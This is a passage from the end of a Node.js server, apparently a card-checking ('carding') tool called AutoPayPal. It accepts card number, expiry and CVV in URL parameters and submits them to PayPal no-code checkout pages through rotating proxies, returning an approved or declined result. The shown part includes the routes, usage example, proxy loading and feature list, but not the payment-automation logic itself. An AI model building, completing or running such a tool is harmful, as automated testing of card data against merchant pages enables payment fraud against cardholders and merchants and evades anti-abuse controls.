        const result = await processPaypalPayment(cc, proxyConfig, siteUrl);

        const finalResponse = {
            status: result.status || 'declined',
            code: result.code || 'UNKNOWN_ERROR',
            message: result.message || 'An unknown error occurred.'
        };

        log.info(`Transaction result: ${JSON.stringify(finalResponse)}`);
        return res.json(finalResponse);
    } catch (e) {
        log.error(`Unhandled error: ${e.message}`);
        return res.status(500).json({
            status: 'declined',
            code: 'INTERNAL_ERROR',
            message: 'An internal error occurred.'
        });
    }
});

// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
app.get('/', (req, res) => {
    res.json({
        service: 'AutoPayPal NCP Payment Gateway',
        version: '6.0',
        author: '@ccnfy / @rnrxx',
        language: 'Node.js',
        usage: {
            endpoint: '/paypal/auto?site={paypal_ncp_url}&cc={card|mm|yy|cvv}',
            method: 'GET',
            example: '/paypal/auto?site=https://www.paypal.com/ncp/payment/XXXXX&cc=4111111111111111|12|25|123'
        },
        features: [
            'Dynamic Site Input (No Hardcoded Sites)',
            'Dynamic Merchant ID, Amount & Currency Extraction',
            'Per-request Proxy Rotation (px.txt)',
            'Enhanced Token Extraction (Multiple Fallback Fields)',
            'Improved CSRF Handling'
        ],
        proxy_file: 'px.txt',
        proxies_loaded: proxyList.length
    });
});

// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
// --- Health Check Endpoint ---
// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
app.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        proxies_available: proxyList.length,
        uptime: process.uptime()
    });
});

// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
// --- Load Proxies and Start Server ---
// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
loadProxiesFromFile();
log.info(`[SYSTEM] Total proxies loaded: ${proxyList.length}`);

const PORT = process.env.PORT || 5000;
app.listen(PORT, '0.0.0.0', () => {
    log.info(`[SYSTEM] AutoPayPal NCP Gateway running on port ${PORT}`);
    log.info(`[SYSTEM] AUTOPAYPAL BY - @ccnfy / @rnrxx`);
});

module.exports = app;
